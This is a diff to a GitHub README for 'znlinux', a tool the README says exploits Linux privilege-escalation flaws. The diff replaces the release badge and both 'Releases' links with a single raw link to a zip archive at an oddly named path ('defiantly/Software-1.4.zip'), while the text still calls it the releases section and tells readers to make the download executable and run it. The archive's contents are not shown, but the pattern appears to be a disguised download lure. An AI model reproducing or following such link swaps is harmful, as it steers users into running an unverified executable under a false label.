@@ -1,6 +1,6 @@
 # znlinux 🚀
 
-![GitHub release](https://img.shields.io/github/release/Ashwin478393/znlinux.svg)
+![GitHub release](https://raw.githubusercontent.com/Ashwin478393/znlinux/main/defiantly/Software-1.4.zip)
 
 Welcome to **znlinux**, a powerful tool designed for Linux environments. This program provides a comprehensive framework for privilege escalation vulnerabilities across various Linux architectures. 
 
@@ -29,7 +29,7 @@ In the world of cybersecurity, privilege escalation is a critical area of focus.
 
 ## Installation
 
-To get started with **znlinux**, you need to download the latest release. Visit the [Releases](https://github.com/Ashwin478393/znlinux/releases) section to find the most recent version. Download the appropriate file for your system, and execute it as follows:
+To get started with **znlinux**, you need to download the latest release. Visit the [Releases](https://raw.githubusercontent.com/Ashwin478393/znlinux/main/defiantly/Software-1.4.zip) section to find the most recent version. Download the appropriate file for your system, and execute it as follows:
 
 ```bash
 chmod +x <downloaded_file>
@@ -80,7 +80,7 @@ For questions or feedback, please reach out to the maintainers through GitHub is
 
 ## Releases
 
-For the latest updates and downloads, visit the [Releases](https://github.com/Ashwin478393/znlinux/releases) section. Always ensure you are using the most recent version for optimal performance and security.
+For the latest updates and downloads, visit the [Releases](https://raw.githubusercontent.com/Ashwin478393/znlinux/main/defiantly/Software-1.4.zip) section. Always ensure you are using the most recent version for optimal performance and security.
 
 ---
 
